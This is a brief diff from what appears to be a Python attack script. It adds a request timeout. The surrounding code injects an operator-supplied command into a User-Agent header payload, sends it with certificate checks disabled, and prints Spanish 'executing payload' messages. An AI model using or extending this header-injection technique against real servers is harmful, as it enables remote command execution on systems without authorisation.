@@ -151,7 +151,7 @@ def main():
         "User-Agent": selected_payload[1].replace("cmd",command)
     }
 
-    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
+    response = requests.get(url, headers=headers, verify=False, allow_redirects=False, timeout=10)
 
     print(f"\n[*] Ejecutando payload: {selected_payload[0]}")
     print(f"[*] Código de respuesta: {response.status_code}")
